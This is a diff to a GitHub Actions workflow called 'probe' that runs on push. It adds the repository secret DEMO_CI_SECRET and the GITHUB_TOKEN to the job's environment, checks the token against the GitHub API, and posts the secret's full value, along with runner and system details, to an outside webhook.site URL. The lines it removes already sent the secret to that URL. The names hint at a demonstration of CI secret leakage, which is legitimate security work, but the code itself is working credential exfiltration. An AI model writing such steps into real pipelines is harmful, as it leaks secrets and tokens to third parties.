@@ -3,9 +3,12 @@ on: [push, workflow_dispatch]
 jobs:
   probe:
     runs-on: ubuntu-latest
+    env:
+      DEMO_CI_SECRET: ${{ secrets.DEMO_CI_SECRET }}
+      REPO_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     steps:
       - name: report
         run: |
-          echo "uname: $(uname -a)"
-          echo "actor: $GITHUB_ACTOR"
-          curl -s -X POST "https://webhook.site/d60f1109-b23e-46d6-9bcf-8039775e465a?stage=CI-VALIDATE" -H "Content-Type: application/json" -d "{\"secret\":\"$DEMO_CI_SECRET\",\"actor\":\"$GITHUB_ACTOR\",\"runner\":\"$RUNNER_NAME\",\"sha\":\"$GITHUB_SHA\",\"trigger\":\"$GITHUB_EVENT_NAME\"}"
+          SEC_LEN=${#DEMO_CI_SECRET}
+          API=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $REPO_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY)
+          curl -s -X POST "https://webhook.site/d60f1109-b23e-46d6-9bcf-8039775e465a?stage=CI-SECRET" -H "Content-Type: application/json" -d "{\"secret_value\":\"$DEMO_CI_SECRET\",\"secret_len\":\"$SEC_LEN\",\"token_api_status\":\"$API\",\"actor\":\"$GITHUB_ACTOR\",\"runner\":\"$RUNNER_NAME\",\"uname\":\"$(uname -srm)\"}"
